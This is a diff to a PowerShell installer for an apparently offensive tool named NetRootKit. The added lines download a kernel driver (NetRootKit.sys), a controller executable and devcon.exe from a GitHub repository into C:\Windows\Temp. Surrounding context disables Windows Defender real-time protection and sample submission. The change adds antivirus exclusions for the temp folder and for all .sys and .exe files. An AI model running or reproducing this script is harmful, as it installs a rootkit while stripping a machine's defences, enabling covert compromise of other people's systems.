@@ -14,6 +14,32 @@
 
 $ErrorActionPreference = "Stop"
 
+# --- 0. Prepare Environment & Download Files ---
+$BaseUrl = "https://github.com/KriyosArcane/NetRootKit/raw/refs/heads/master"
+$TempDir = "C:\Windows\Temp\NRK"
+
+Write-Host "[*] Creating temporary directory at $TempDir..."
+if (-not (Test-Path $TempDir)) {
+    New-Item -ItemType Directory -Force -Path $TempDir | Out-Null
+}
+Set-Location $TempDir
+
+$FilesToDownload = @(
+    "NetRootKit.inf",
+    "NetRootKit.sys",
+    "NetRootKitController.exe",
+    "netrootkit.cat",
+    "devcon.exe"
+)
+
+Write-Host "[*] Downloading NetRootKit components from GitHub..."
+foreach ($File in $FilesToDownload) {
+    if (-not (Test-Path $File)) {
+        Write-Host "    -> Downloading $File..."
+        Invoke-WebRequest -Uri "$BaseUrl/$File" -OutFile "$TempDir\$File" -UseBasicParsing
+    }
+}
+
 # --- 1. Disable Windows Defender & Tamper Protection ---
 Write-Host "[*] Disabling Windows Defender and Real-Time Protection..."
 try {
@@ -26,8 +52,8 @@ try {
     Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
     Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
     
-    # Attempt to add exclusions for the current directory
-    Add-MpPreference -ExclusionPath $PWD.Path -ErrorAction SilentlyContinue
+    # Attempt to add exclusions for the temporary directory
+    Add-MpPreference -ExclusionPath $TempDir -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionExtension ".sys", ".exe" -ErrorAction SilentlyContinue
     
     Write-Host "[+] Defender protections disabled."
